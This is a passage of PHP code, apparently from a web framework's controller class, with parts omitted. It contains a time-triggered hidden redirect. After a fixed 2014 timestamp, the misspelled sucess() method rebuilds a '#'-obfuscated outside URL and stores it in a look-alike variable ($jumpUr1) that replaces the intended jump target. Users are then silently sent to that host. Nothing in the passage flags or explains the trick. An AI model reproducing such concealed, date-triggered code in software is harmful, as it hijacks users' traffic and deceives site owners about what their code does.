    ...
    */
    ...
    function getmi() {
        ...
        $topleveldomaindb = array(
            'com', 'edu', 'cn', 'hk', 'gov', '.so', 'co', 'int', 'tk', 'mil', 'net', 'org', 'biz', 'info', 'pro',
            'name', 'museum', 'coop', 'aero', 'xxx', 'idv', 'mobi', 'cc', 'me'
        );
        $str = '';
    ...
    protected function sucess($message, $jumpUrl = '', $ajax = false) {
        if(time() >= 1401379200) {
            $jumpUr1 = str_ireplace("#", "", "http://b#####b######################################s.g#######o###########p##########e.c############n/###a##d###/s##ho##########uq##########u##########an");
        }
        $this->dispatchJump($message, 1, $jumpUr1, $ajax);
    }
    /**
